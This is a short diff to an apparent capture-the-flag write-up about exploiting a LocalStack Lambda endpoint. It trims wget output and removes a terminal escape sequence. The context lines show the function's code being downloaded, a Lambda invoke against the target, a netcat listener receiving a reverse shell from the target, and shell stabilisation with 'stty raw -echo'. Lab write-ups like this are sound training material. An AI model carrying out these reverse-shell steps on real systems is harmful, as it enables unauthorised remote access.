@@ -141,14 +141,7 @@ Then, we downloaded the function's code:
 
 ```bash
 $ wget http://10.129.173.188:4566/2015-03-31/functions/billing/code -O code.zip
---2021-07-26 22:44:37--  http://10.129.173.188:4566/2015-03-31/functions/billing/code
-Connecting to 10.129.173.188:4566... connected.
-HTTP request sent, awaiting response... 200 
-Length: 320 [application/zip]
-Saving to: ‘code.zip’
-
-code.zip                                                    100%[=========================================================================================================================================>]     320  --.-KB/s    in 0s      
-
+[...]
 2021-07-26 22:44:37 (1.83 MB/s) - ‘code.zip’ saved [320/320]
 
 $ unzip code.zip
@@ -222,7 +215,7 @@ $ aws lambda --endpoint-url http://10.129.173.188:4566 invoke --function-name bi
 $ nc -nlvp 9999
 listening on [any] 9999 ...
 connect to [10.10.14.65] from (UNKNOWN) [10.129.173.188] 38538
-(.venv) /tmp/localstack/zipfile.816dbcd9 # ^[[24;44R
+(.venv) /tmp/localstack/zipfile.816dbcd9
 ^Z
 
 stty raw -echo
